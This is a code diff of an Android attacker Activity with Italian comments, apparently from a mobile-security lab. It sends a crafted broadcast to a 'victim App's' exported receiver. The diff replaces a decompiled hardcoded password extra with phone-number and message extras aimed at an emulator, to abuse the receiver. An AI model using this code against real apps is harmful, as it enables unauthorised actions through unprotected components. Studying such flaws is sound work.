@@ -16,15 +16,15 @@ public class ExportedReceiver extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-
         String PACKAGE = getIntent().getStringExtra("Package");
         String Receiver= getIntent().getStringExtra("Receiver");
         String ReceiverACTION = getIntent().getStringExtra("ReceiverACTION");
         Log.v("PACKAGE",PACKAGE);
         Log.v("Receiver",Receiver);
         Log.v("ReceiverACTION",ReceiverACTION);
-        Intent intent = new Intent(ReceiverACTION);
-        intent.putExtra("PASSWORD", "1000"); //il PASSWORD è un parametro che vedi nel jd gui ---> paramIntent.getStringExtra("PASSWORD")
+        Intent intent = new Intent(ReceiverACTION);//inserisci sempre l'ACTION
+        intent.putExtra("phoneNumber","5554");//5554 è il nome dell'emulatore
+        intent.putExtra("message", "Sono un attaccante"); //il PASSWORD è un parametro che vedi nel jd gui ---> paramIntent.getStringExtra("PASSWORD")
         sendBroadcast(intent);
         Toast info=Toast.makeText(this,"Send Broadcast to the victim App",Toast.LENGTH_SHORT);
         info.show();
